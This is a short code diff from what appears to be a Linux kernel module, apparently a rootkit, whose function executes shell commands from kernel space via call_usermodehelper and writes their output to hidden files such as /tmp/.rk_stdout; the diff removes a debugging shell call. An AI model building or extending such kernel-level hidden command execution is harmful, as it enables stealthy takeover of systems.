@@ -137,14 +137,7 @@ static int execute_and_stream_output(const char *cmd) {
         }
     }
 
-    // Output a simple test string directly to stdout file for debugging
-    char *debug_argv[] = {"/bin/sh", "-c", "echo 'DEBUG OUTPUT' > /tmp/.rk_stdout", NULL};
-    old_fs = get_fs();
-    set_fs(KERNEL_DS);
-    call_usermodehelper(debug_argv[0], debug_argv, NULL, UMH_WAIT_PROC);
-    set_fs(old_fs);
-
-    // Check if files exist
+    // Check if files exist - just debugging info
     struct file *f_stdout, *f_stderr, *f_status;
     f_stdout = filp_open(tmp_stdout, O_RDONLY, 0);
     f_stderr = filp_open(tmp_stderr, O_RDONLY, 0);
